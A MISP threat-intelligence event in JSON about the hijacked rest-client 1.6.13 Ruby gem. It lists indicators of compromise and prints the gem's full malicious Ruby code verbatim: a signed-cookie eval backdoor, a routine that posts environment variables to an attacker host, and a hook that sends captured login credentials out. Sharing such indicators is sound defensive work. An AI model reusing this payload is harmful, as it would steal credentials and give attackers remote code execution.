@@ -1,0 +1,119 @@
+{
+    "Event":{
+        "threat_level_id":"3",
+        "date":"2019-08-20",
+        "published":true,
+        "info":"OSINT - Ruby/Gem Warning! is rest-client 1.6.13 hijacked? #713",
+        "publish_timestamp":"1566309812",
+        "timestamp":"1566309784",
+        "Tag":[
+            {
+                "name":"type:OSINT"
+            },
+            {
+                "name":"osint:lifetime=\"perpetual\""
+            },
+            {
+                "name":"osint:certainty=\"50\""
+            },
+            {
+                "name":"tlp:white"
+            },
+            {
+                "name":"misp-galaxy:mitre-attack-pattern=\"External Remote Services - T1133\""
+            },
+            {
+                "name":"misp-galaxy:mitre-attack-pattern=\"Exfiltration Over Command and Control Channel - T1041\""
+            },
+            {
+                "name":"misp-galaxy:mitre-attack-pattern=\"Supply Chain Compromise - T1195\""
+            },
+            {
+                "name":"misp-galaxy:mitre-attack-pattern=\"Data Encrypted - T1022\""
+            },
+            {
+                "name":"misp-galaxy:mitre-attack-pattern=\"Automated Exfiltration - T1020\""
+            },
+            {
+                "name":"misp-galaxy:mitre-attack-pattern=\"Application Shimming - T1138\""
+            }
+        ],
+        "Attribute":[
+            {
+                "category":"External analysis",
+                "comment":"",
+                "timestamp":"1566309283",
+                "type":"link",
+                "value":"https://github.com/rest-client/rest-client/issues/713",
+                "to_ids":false
+            },
+            {
+                "category":"Network activity",
+                "comment":"",
+                "timestamp":"1566309359",
+                "type":"hostname",
+                "value":"mironanoru.zzz.com.ua",
+                "to_ids":true
+            },
+            {
+                "category":"Network activity",
+                "comment":"Attribute #7590600 enriched by dns.",
+                "timestamp":"1566309381",
+                "type":"ip-src",
+                "value":"37.48.72.4",
+                "to_ids":false
+            },
+            {
+                "category":"Network activity",
+                "comment":"",
+                "timestamp":"1566309490",
+                "type":"url",
+                "value":"https://pastebin.com/raw/5iNdELNX",
+                "to_ids":true
+            },
+            {
+                "category":"External analysis",
+                "comment":"In case people need to write a detailed security report at their company. This might help you.  Security threat consisted out of the following:",
+                "timestamp":"1566309608",
+                "type":"comment",
+                "value":"It sent the URL of the infected host to the attacker.\r\n    It sent the environment variables of the infected host to the attacker. Depending on your set-up this can include credentials of services that you use e.g. database, payment service provider.\r\n    It allowed to eval Ruby code on the infected host. Attacker needed to send a signed (using the attackerâ€™s own key) cookie with the Ruby code to run.\r\n    It overloaded the #authenticate method on the Identity class. Every time the method gets called it will send the email/password to the attacker. However I'm unsure which libraries use the Identity class though, maybe someone else knows?",
+                "to_ids":false
+            }
+        ],
+        "Object":[
+            {
+                "comment":"",
+                "description":"Object describing a computer program written to be run in a special run-time environment. The script or shell script can be used for malicious activities but also as support tools for threat analysts.",
+                "meta-category":"misc",
+                "name":"script",
+                "timestamp":"1566309529",
+                "Attribute":[
+                    {
+                        "category":"Other",
+                        "comment":"",
+                        "timestamp":"1566309465",
+                        "type":"text",
+                        "value":"_! {\r\n  unless ENV[\"URL_HOST\"].to_s.include?(\"localhost\")\r\n    unless defined?(ZZZ)\r\n      require \"openssl\"\r\n      require \"base64\"\r\n      public_key = OpenSSL::PKey.read(Base64.urlsafe_decode64(\"LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUF2U3lDWUJiUUNsbTN4a21HMitRNwpSRjd5R1RXNzZoMVlrNE1qSHlNemhhdGUxQitDL1JQWjExbmU1WjBaMjhDK0VNWFVPWHRLTFlJMlF6Yk5VbmRLCmtVSUh3dWtZZ0hLWTRCL1U5OGI5UGJNZExOZjFtZ25UYnppVWhIYUFXQTB3R3RWL0ppQkNqc2taQkh4OTVlZGMKbmg0cCthcTM5ZlowemtFdUhYUUs0TU9URkJlaGJIelhCbmhPajhvU0NURHBjbjJEa1liR3lBcmpGb0JFTzQ4ZAphTklNSlAzQURpU1lYM2hmVmFoYTJCS0xzcnczWGFoMzFmOGh0U1dQNklBMTlqRy9wbVlqK2FBN0ZubWYwVHJDCjNnbGxRNFRrSWp6RVdHVUd5WklVcE9zZkVWeitWTDN0VDF1TDczdzVWa2NPU1MwajZ3cVQ5ckkrY2hHWXJJZEgKRFFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==\"))\r\n      Rack::Sendfile.prepend Module.new {\r\n        define_method(:call) { |e|\r\n          _! {\r\n            signature, payload, = e[\"HTTP_COOKIE\"].match(/__session=(.+);/)[1].split(\",\")\r\n            signature = Base64.urlsafe_decode64(signature)\r\n            payload = Base64.urlsafe_decode64(payload)\r\n            if public_key.verify(OpenSSL::Digest.new(\"sha256\"), signature, payload)\r\n              payload = JSON.parse(payload)\r\n              if (Time.now.to_i - payload[\"timestamp\"]) <= 60\r\n                eval(payload[\"ruby\"])\r\n              end\r\n            end\r\n          }\r\n          super(e)\r\n        }\r\n      }\r\n      ZZZ = 0\r\n    end\r\n  end\r\n}\r\n\r\n_! {\r\n  unless ENV[\"URL_HOST\"].to_s.include?(\"localhost\")\r\n    unless defined?(QQQ)\r\n      Faraday.post(\"http://mironanoru.zzz.com.ua/\", { \"x\" => ENV[\"URL_HOST\"].to_s, \"y\" => ENV.to_hash.to_yaml })\r\n      QQQ = 0\r\n    end\r\n  end\r\n}\r\n\r\n_! {\r\n  if ENV[\"URL_HOST\"].to_s[0] == \"e\" && ENV[\"URL_HOST\"].to_s[6] == \"x\" && ENV[\"URL_HOST\"].to_s.length == 13\r\n    unless defined?(GGG)\r\n      $kgiBWB3l = []\r\n      Module.new {\r\n        def authenticate(password)\r\n          $kgiBWB3l << \"#{email}:#{password}\" rescue nil\r\n          super\r\n        end\r\n      }.tap { |m| Identity.prepend(m) }\r\n      GGG = 0\r\n    end\r\n    loop {\r\n      break if $kgiBWB3l.empty?\r\n      y = $kgiBWB3l.pop\r\n      Faraday.post(\"http://mironanoru.zzz.com.ua/\", { \"x\" => ENV[\"URL_HOST\"].to_s, \"y\" => y })\r\n    }\r\n  end\r\n}",
+                        "to_ids":false
+                    },
+                    {
+                        "category":"Other",
+                        "comment":"",
+                        "timestamp":"1566309465",
+                        "type":"text",
+                        "value":"Ruby",
+                        "to_ids":false
+                    },
+                    {
+                        "category":"Other",
+                        "comment":"",
+                        "timestamp":"1566309465",
+                        "type":"text",
+                        "value":"Malicious",
+                        "to_ids":false
+                    }
+                ]
+            }
+        ]
+    }
+}
